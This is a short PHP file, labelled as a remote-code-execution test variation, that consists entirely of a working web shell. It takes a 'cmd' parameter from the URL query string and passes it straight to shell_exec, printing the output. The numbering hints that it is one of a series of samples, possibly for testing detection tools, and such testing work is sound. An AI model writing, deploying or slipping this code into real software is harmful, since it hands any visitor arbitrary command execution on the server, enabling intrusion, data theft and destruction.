<?php
// RCE test variation #203
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>